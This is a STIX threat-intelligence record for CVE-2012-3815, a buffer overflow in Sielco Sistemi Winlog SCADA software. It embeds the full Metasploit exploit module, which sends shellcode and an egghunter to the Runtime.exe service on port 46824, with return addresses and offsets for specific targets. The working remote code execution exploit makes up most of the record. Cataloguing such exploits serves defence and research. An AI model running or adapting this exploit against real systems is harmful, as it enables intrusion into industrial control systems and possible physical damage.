{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9eb2f6b4-16d9-4f54-9552-b34a9a2f7028",
    "created": "2024-08-14T16:39:24.698908Z",
    "modified": "2024-08-14T16:39:24.698912Z",
    "name": "Sielco Sistemi Winlog Buffer Overflow 2.07.14 - 2.07.16",
    "description": " This module exploits a buffer overflow in Sielco Sistem Winlog <= 2.07.16. When sending a specially formatted packet to the Runtime.exe service on port 46824 an attacker may be able to execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/scada/winlog_runtime_2.rb",
            "external_id": "winlog_runtime_2.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-3815"
        },
        {
            "source_name": "reference",
            "url": "http://www.s3cur1ty.de/m1adv2012-001"
        },
        {
            "source_name": "reference",
            "url": "http://www.sielcosistemi.com/en/download/public/winlog_lite.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Egghunter\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'         => 'Sielco Sistemi Winlog Buffer Overflow 2.07.14 - 2.07.16',\n      'Description'  => %q{\n        This module exploits a buffer overflow in Sielco Sistem Winlog <= 2.07.16.\n        When sending a specially formatted packet to the Runtime.exe service on port 46824,\n        an attacker may be able to execute arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Michael Messner <devnull[at]s3cur1ty.de>'\n        ],\n      'References'     =>\n        [\n          [ 'BID', '53811'],\n          [ 'CVE', '2012-3815'],\n          [ 'OSVDB', '82654'],\n          [ 'EDB', '18986'],\n          [ 'URL', 'http://www.s3cur1ty.de/m1adv2012-001' ],\n          [ 'URL', 'http://www.sielcosistemi.com/en/download/public/winlog_lite.html' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Platform'       => 'win',\n      'Payload'        =>\n        {\n          'Space'    => 2000,\n          'BadChars' => \"\\x00\",\n          'DisableNops' => true,\n        },\n      'Targets'        =>\n        [\n          [ 'Sielco Sistemi Winlog 2.07.14/2.07.16 - Ceramics Kiln Project',\n            {\n              'Ret'    => 0x405153df,\n              'Offset' => 167,\n            }\n          ], #  Jmp ESP - Vclx40.bpl - 0x405153df\n          [ 'Sielco Sistemi Winlog 2.07.14 - Automatic Washing System Project',\n            {\n              'Ret'    => 0x405153df,\n              'Offset' => 151,\n            }\n          ], #  Jmp ESP - Vclx40.bpl - 0x405153df\n          #The reliability depends on the actual project. We need to generate some more\n          #targets. Two of them for the default project and one other project is now available.\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-06-04',\n      'DefaultTarget'  => 0))\n\n    register_options([Opt::RPORT(46824)])\n  end\n\n  def exploit\n    connect\n\n    egghunter,egg = generate_egghunter(payload.encoded, payload_badchars)\n\n    print_status(\"Placing the shellcode\")\n    shellcode = rand_text_alpha(2000)\n    shellcode << egg\n    sock.put(shellcode)\n\n    select(nil,nil,nil,1)\n\n    buffer = rand_text_alpha(20)\n    buffer << \"\\x14\" * 10 \t#trigger the crash\n    buffer << rand_text_alpha(target['Offset'])\n    buffer << [target.ret].pack('V')\n    buffer << egghunter\n    buffer << rand_text_alpha(69 - egghunter.length)\n\n    print_status(\"Trying target #{target.name}...\")\n    sock.put(buffer)\n\n    handler\n    disconnect\n\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2012-06-04",
    "x_mitre_platforms": [
        "win'"
    ]
}